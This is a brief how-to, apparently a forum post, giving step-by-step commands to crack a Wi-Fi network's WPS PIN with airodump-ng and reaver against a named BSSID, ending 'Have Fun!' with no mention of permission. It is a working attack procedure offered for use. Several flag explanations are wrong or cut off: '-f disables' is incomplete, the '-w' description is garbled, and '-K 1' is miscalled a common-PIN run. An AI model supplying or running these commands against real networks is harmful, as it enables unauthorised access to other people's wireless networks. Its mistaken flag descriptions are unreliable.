1) Set monitor mode

2) run "airodump-ng wlan0mon --wps"
This will allow you to see who is using wps

3) reaver -i wlan0mon -b A4:2B:8C:AC:68:86 -c 1 -f -a -w -vv -K 1
-i is the interface you will be using
-b is the bssid
-c is the channel you are on
-f disables 
-a auto detects the best option
-w mimics windows 7 registry arp
-v verbose
-vv very verbose
-K 1 is pixy attack, runs through most common pins
If your pin times out or keeps retrying it probrably doesn't allow a brute force.
Have Fun!
